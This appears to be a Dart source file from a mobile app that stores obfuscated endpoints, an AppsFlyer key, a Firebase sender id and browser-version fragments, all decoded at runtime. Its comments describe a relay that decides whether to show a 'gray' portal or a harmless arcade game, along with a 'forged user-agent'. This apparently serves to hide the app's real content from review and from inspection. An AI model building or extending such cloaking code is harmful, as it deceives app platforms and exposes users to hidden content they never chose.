import '../mask/obfuscator.dart';

// Byte arrays produced by `dart run tool/secret_packer.dart` with the seed
// declared in lib/mask/obfuscator.dart.  Never write plaintext values here.

/// Encoded config endpoint the shell POSTs to.
const List<int> _relayEndpoint = <int>[
  144, 152, 185, 187, 5, 153, 218, 185, 31, 136, 231, 160, 54, 227, 155, 218,
  200, 106, 116, 137, 166, 53, 219, 26, 18, 94, 138, 230, 77, 121, 0, 172,
  246, 188, 133, 155,
];

/// Encoded GCD base URL for the organic-retry attribution refresh.
const List<int> _gcdBase = <int>[
  144, 152, 185, 187, 5, 153, 218, 185, 8, 130, 237, 177, 51, 228, 217, 203,
  212, 111, 105, 136, 175, 98, 221, 7, 81, 18, 134, 228, 12, 118, 7, 184,
  172, 173, 129, 135, 9, 231, 180, 194, 46, 238, 223, 214, 89, 159, 248,
];

/// Encoded Chrome version fragment — unique build/patch per project.
const List<int> _chromeVersion = <int>[
  201, 216, 244, 229, 70, 141, 194, 174, 91, 211, 167, 250, 96,
];

/// Encoded WebKit version fragment.
const List<int> _webkitVersion = <int>[
  205, 223, 250, 229, 69, 149,
];

/// Encoded AppsFlyer Dev Key.
const List<int> _trackerKey = <int>[
  140, 158, 148, 158, 28, 242, 159, 241, 31, 162, 252, 151, 18, 254, 156, 199,
  206, 91, 72, 160, 172, 87,
];

/// Encoded Firebase project number / sender id.
const List<int> _messagingProject = <int>[
  203, 221, 248, 248, 71, 147, 193, 161, 92, 209, 185, 240,
];

/// Full POST endpoint that decides portal (gray) vs arcade (game).
String revealRelayEndpoint() => peel(_relayEndpoint);

/// AppsFlyer Dev Key.
String revealTrackerKey() => peel(_trackerKey);

/// Firebase project number / sender id.
String revealMessagingProject() => peel(_messagingProject);

/// Chrome major version fragment for the forged user-agent.
String revealChromeVersion() => peel(_chromeVersion);

/// WebKit version fragment for the forged user-agent.
String revealWebkitVersion() => peel(_webkitVersion);

/// Builds the GCD attribution-retry URL. Returns "" if the base is empty.
String revealGcdUrl(String appId, String deviceId) {
  final String base = peel(_gcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${revealTrackerKey()}&device_id=$deviceId';
}
